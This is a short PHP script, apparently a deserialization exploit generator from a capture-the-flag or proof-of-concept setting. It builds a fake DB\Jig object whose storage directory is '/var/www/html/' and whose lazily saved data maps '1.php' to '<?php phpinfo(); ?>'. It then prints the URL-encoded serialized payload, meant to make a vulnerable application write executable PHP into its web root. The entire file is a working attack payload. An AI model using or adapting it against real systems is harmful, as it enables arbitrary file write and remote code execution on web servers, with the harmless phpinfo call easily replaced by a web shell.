<?php

namespace DB;

//! In-memory/flat-file DB wrapper
class Jig {

	//@{ Storage formats
	const
		FORMAT_JSON=0,
		FORMAT_Serialized=1;
    //@}
    protected
		//! Storage location
        $dir = '/var/www/html/',
		//! Current storage format
        $format = 'self::FORMAT_JSON',
		//! Memory-held data
        $data = array('1.php'=>array('a'=>'<?php phpinfo(); ?>')),
		//! lazy load/save files
        $lazy = TRUE;
        
	/**
	*	Read data from memory/file
	*	@return array
	*	@param $file string
    **/
}
$jig = new jig();
echo urlencode(serialize($jig));

?>
